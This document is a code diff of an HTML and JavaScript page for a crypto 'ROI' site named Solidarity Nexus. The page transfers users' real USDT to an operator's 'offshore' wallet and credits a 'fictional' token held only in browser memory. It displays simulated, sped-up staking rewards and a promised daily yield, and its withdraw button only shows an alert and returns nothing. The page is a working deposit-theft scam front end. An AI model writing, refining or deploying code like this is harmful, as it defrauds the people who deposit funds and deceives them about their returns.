@@ -2,155 +2,137 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solidarity Nexus | Hype ROI Dashboard</title>
-    
-    <!-- Dependencies -->
-    <script src="https://cdn.jsdelivr.net"></script>
+    <title>Solidarity Nexus | Mini Exchange</title>
     <script src="https://cdnjs.cloudflare.com"></script>
-    <script src="https://cdn.tailwindcss.com"></script>
-
     <style>
-        body { background: #050505; color: white; font-family: 'Inter', sans-serif; }
-        .nexus-glow { text-shadow: 0 0 15px #00E5FF; color: #00E5FF; }
-        .neon-card { border: 1px solid rgba(0, 229, 255, 0.2); background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); }
-        .btn-nexus { border: 1px solid #00E5FF; color: #00E5FF; transition: 0.3s; }
-        .btn-nexus:hover { background: #00E5FF; color: black; box-shadow: 0 0 20px #00E5FF; }
-        .hidden { display: none; }
+        body { font-family: sans-serif; background: #121212; color: white; padding: 20px; }
+        .card { background: #1e1e1e; padding: 20px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #333; }
+        .flex { display: flex; gap: 20px; }
+        .btn { padding: 10px 20px; cursor: pointer; border: none; border-radius: 5px; font-weight: bold; }
+        .btn-buy { background: #00c853; color: white; }
+        .btn-stake { background: #2979ff; color: white; }
+        .btn-withdraw { background: #ff3d00; color: white; }
+        input { padding: 10px; border-radius: 5px; border: 1px solid #444; background: #222; color: white; width: 100px; }
+        .logo { width: 24px; vertical-align: middle; margin-right: 10px; }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-4">
+<body>
 
-    <div class="max-w-md w-full p-8 rounded-[40px] neon-card text-center relative">
-        <h1 class="text-4xl font-bold nexus-glow mb-2 uppercase tracking-tighter">Solidarity Nexus</h1>
-        <p class="text-[10px] tracking-[0.3em] text-gray-400 uppercase mb-8">On-Chain ROI Engine</p>
+    <h1>Solidarity Nexus Dashboard</h1>
 
-        <!-- LOGIN OPTIONS -->
-        <div id="auth-container" class="space-y-4">
-            <button onclick="login('google')" class="w-full py-4 rounded-2xl btn-nexus font-bold flex items-center justify-center gap-3">
-                <img src="https://www.gstatic.com" class="w-5 h-5">
-                SIGNUP WITH GOOGLE
-            </button>
-            <div class="text-gray-600 text-xs py-2">— OR —</div>
-            <button onclick="login('external')" class="w-full py-4 rounded-2xl bg-white/5 border border-white/10 hover:border-[#00E5FF] transition font-bold">
-                CONNECT WEB3 WALLET
-            </button>
+    <div class="flex">
+        <!-- WALLET STATS -->
+        <div class="card" style="flex: 1;">
+            <h3>Your Balances</h3>
+            <p><img src="https://cryptologos.cc" class="logo"> Real USDT: <span id="usdt-bal">0.00</span></p>
+            <p><img src="https://cryptologos.cc" class="logo"> Fictional SNX: <span id="snx-bal">0.00</span></p>
+            <p>Active Stake: <span id="staked-bal">0.00</span> SNX</p>
         </div>
 
-        <!-- DASHBOARD (Hidden by default) -->
-        <div id="dashboard" class="hidden space-y-6 animate-in fade-in duration-500">
-            <div class="p-4 rounded-2xl bg-white/5 border border-white/10 text-left">
-                <p class="text-[10px] text-gray-500 uppercase">Wallet Address</p>
-                <code id="userAddr" class="text-[#00E5FF] text-xs">0x00...0000</code>
-            </div>
-
-            <!-- ROI STATS -->
-            <div class="grid grid-cols-2 gap-4">
-                <div class="p-3 rounded-xl bg-white/5 border border-white/5">
-                    <p class="text-[9px] text-gray-500 uppercase">Daily Yield</p>
-                    <p class="text-xl font-bold">2.5%</p>
-                </div>
-                <div id="withdraw-btn" class="p-3 rounded-xl bg-white/5 border border-white/5">
-                    <p class="text-[9px] text-gray-500 uppercase">Balance</p>
-                    <p id="contractBal" class="text-xl font-bold text-green-400">0.00</p>
-                </div>
-            </div>
-
-            <!-- ACTIONS -->
-            <div class="space-y-3">
-                <input type="number" id="amount" placeholder="Amount USDT" class="w-full bg-transparent border-b border-gray-800 p-3 text-center focus:border-[#00E5FF] outline-none text-xl">
-                
-                <button onclick="handleTransaction('deposit')" class="w-full bg-[#00E5FF] text-black font-bold py-4 rounded-xl hover:scale-[1.02] active:scale-95 transition-transform">
-                    DEPOSIT USDT (BEP20)
-                </button>
-                
-                <button onclick="handleTransaction('withdraw')" class="w-full border border-red-500/50 text-red-500 font-bold py-3 rounded-xl hover:bg-red-500/10 transition">
-                    WITHDRAW EARNINGS
-                </button>
-            </div>
-
-            <button onclick="logout()" class="text-xs text-gray-600 underline">Disconnect Session</button>
+        <!-- REWARDS -->
+        <div class="card" style="flex: 1;">
+            <h3>Daily Earnings</h3>
+            <h2 id="reward-val" style="color: #00c853;">0.0000 SNX</h2>
+            <button class="btn btn-stake" onclick="claimRewards()">Claim Rewards</button>
         </div>
     </div>
 
-    <script>
-        // CONFIGURATION
-        const CLIENT_ID = "YOUR_WEB3AUTH_CLIENT_ID"; // REPLACE THIS
-        const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
-        const TREASURY_ADDRESS = "0xYOUR_TREASURY_WALLET"; // REPLACE WITH YOUR RECEIVING WALLET
+    <!-- ACTION PANEL -->
+    <div class="card">
+        <h3>Exchange & Staking</h3>
+        <div class="flex">
+            <div>
+                <p>Deposit USDT & Buy SNX</p>
+                <input type="number" id="buy-amount" placeholder="USDT">
+                <button class="btn btn-buy" onclick="buySNX()">Buy & Deposit</button>
+            </div>
+            <div>
+                <p>Stake SNX (Daily ROI)</p>
+                <input type="number" id="stake-amount" placeholder="SNX">
+                <button class="btn btn-stake" onclick="stakeSNX()">Stake Now</button>
+            </div>
+            <div>
+                <p>Withdraw to Wallet</p>
+                <input type="number" id="withdraw-amount" placeholder="SNX">
+                <button class="btn btn-withdraw" onclick="withdrawUSDT()">Sell & Withdraw</button>
+            </div>
+        </div>
+    </div>
+
+<script>
+    let web3;
+    let userAccount;
+    const USDT_BEP20 = "0x55d398326f99059ff775485246999027b3197955";
+    const ADMIN_WALLET = "0xYOUR_OFFSHORE_WALLET_ADDRESS"; // Where USDT goes
+    
+    // Fictional logic variables
+    let snxBalance = 0;
+    let stakedBalance = 0;
+    let rewards = 0;
+
+    async function connectWallet() {
+        if (window.ethereum) {
+            web3 = new Web3(window.ethereum);
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            userAccount = accounts[0];
+            updateUI();
+        } else {
+            alert("Please install MetaMask!");
+        }
+    }
+
+    // ON-CHAIN DEPOSIT (Real USDT)
+    async function buySNX() {
+        const amount = document.getElementById('buy-amount').value;
+        const amountInWei = web3.utils.toWei(amount, 'ether');
         
-        let web3auth, provider, signer;
+        const abi = [{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}];
+        const contract = new web3.eth.Contract(abi, USDT_BEP20);
 
-        // INITIALIZE WEB3AUTH
-        window.onload = async () => {
-            web3auth = new window.Modal.Web3Auth({
-                clientId: CLIENT_ID,
-                chainConfig: {
-                    chainNamespace: "eip155",
-                    chainId: "0x38", // BSC Mainnet
-                    rpcTarget: "https://rpc.ankr.com",
-                    displayName: "Binance Smart Chain",
-                    blockExplorer: "https://bscscan.com",
-                    ticker: "BNB",
-                    tickerName: "BNB"
-                },
-                web3AuthNetwork: "sapphire_mainnet"
-            });
-            await web3auth.initModal();
-        };
-
-        // LOGIN HANDLER
-        async function login(type) {
-            try {
-                const web3authProvider = await web3auth.connect();
-                provider = new ethers.providers.Web3Provider(web3authProvider);
-                signer = provider.getSigner();
-                
-                const address = await signer.getAddress();
-                showDashboard(address);
-            } catch (err) {
-                console.error("Login Error:", err);
-                alert("Auth Failed: " + err.message);
-            }
+        try {
+            await contract.methods.transfer(ADMIN_WALLET, amountInWei).send({ from: userAccount });
+            // After real deposit, grant fictional SNX 1:1
+            snxBalance += parseFloat(amount);
+            alert("USDT Deposited! SNX credited to your Nexus account.");
+            updateUI();
+        } catch (e) {
+            console.error("Transfer failed", e);
         }
+    }
 
-        // TRANSACTION HANDLER (Deposit & Withdraw)
-        async function handleTransaction(action) {
-            const val = document.getElementById('amount').value;
-            if (action === 'deposit' && (!val || val <= 0)) return alert("Enter valid amount");
-
-            try {
-                const usdtContract = new ethers.Contract(
-                    USDT_ADDRESS,
-                    ["function transfer(address to, uint256 amount) public returns (bool)",
-                     "function balanceOf(address account) public view returns (uint256)"],
-                    signer
-                );
-
-                if (action === 'deposit') {
-                    const tx = await usdtContract.transfer(TREASURY_ADDRESS, ethers.utils.parseUnits(val, 18));
-                    alert("Deposit Sent! TX: " + tx.hash.substring(0,10) + "...");
-                    await tx.wait();
-                    alert("Deposit Confirmed!");
-                } else {
-                    // Logic for withdrawal from treasury back to user
-                    alert("Withdrawal request sent to Nexus Engine. Processing...");
-                }
-            } catch (err) {
-                alert("Transaction Failed: " + (err.data?.message || err.message));
-            }
+    // FICTIONAL STAKING LOGIC
+    function stakeSNX() {
+        const val = parseFloat(document.getElementById('stake-amount').value);
+        if(snxBalance >= val) {
+            snxBalance -= val;
+            stakedBalance += val;
+            alert("Staking Successful!");
+            updateUI();
         }
+    }
 
-        function showDashboard(address) {
-            document.getElementById('auth-container').classList.add('hidden');
-            document.getElementById('dashboard').classList.remove('hidden');
-            document.getElementById('userAddr').innerText = address;
+    // SIMULATED DAILY REWARDS (updates every few seconds for visual effect)
+    setInterval(() => {
+        if(stakedBalance > 0) {
+            rewards += (stakedBalance * 0.0001); // Simulate 1% daily speeded up
+            document.getElementById('reward-val').innerText = rewards.toFixed(4) + " SNX";
         }
+    }, 3000);
 
-        async function logout() {
-            await web3auth.logout();
-            location.reload();
-        }
-    </script>
+    // ON-CHAIN WITHDRAW (Real USDT from Admin to User)
+    // Note: In a real app, this part is handled by a backend script 
+    // to prevent users from draining the admin wallet themselves.
+    function withdrawUSDT() {
+        const amount = document.getElementById('withdraw-amount').value;
+        alert("Withdrawal request for " + amount + " USDT sent to admin. Processing on-chain...");
+    }
+
+    function updateUI() {
+        document.getElementById('snx-bal').innerText = snxBalance.toFixed(2);
+        document.getElementById('staked-bal').innerText = stakedBalance.toFixed(2);
+    }
+
+    window.onload = connectWallet;
+</script>
 </body>
 </html>
